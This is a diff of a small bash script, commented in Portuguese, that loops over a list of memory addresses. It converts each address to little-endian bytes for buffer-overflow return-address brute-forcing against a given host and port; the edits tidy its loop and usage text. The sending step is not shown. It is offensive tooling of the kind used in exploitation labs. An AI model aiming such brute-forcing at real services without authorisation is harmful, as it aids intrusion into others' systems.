@@ -17,14 +17,13 @@
 
 #Modo de Uso: ./bof_enum.sh 192.168.0.1 80 list.txt 1036
 
-
 #Definindo Variaveis
 host=$1
 port=$2
 file=$3
 buff_size=$4
 
-mode="Modo de Uso: ./bof_enum_functions.sh 192.168.0.1 80 list.txt 1036"
+mode="Modo de Uso: ./bof_enum.sh 192.168.0.1 80 list.txt 1036"
 
 if [[ $4 -eq 0 ]] ; then
     echo $mode
@@ -33,12 +32,12 @@ fi
 
 echo " "
 
-#Lendo arquivo com funcoes
-cat $file | cut -d " " -f 1 > addr.txt
 
 #percorrendo a lista
-for i in $(cat addr.txt)
+for i in $(cat $file | cut -d " " -f 1)
 do
+        #display
+        echo "Testando: "$i
         #Montando Endereco LittleIndia
         addr=("\x"${i:8:2}"\x"${i:6:2}"\x"${i:4:2}"\x"${i:2:2})
 
@@ -47,7 +46,7 @@ do
 
         #pausando a execucao 1 seg
         sleep 1
-
         echo " "
 done
+
 echo "Concluido"
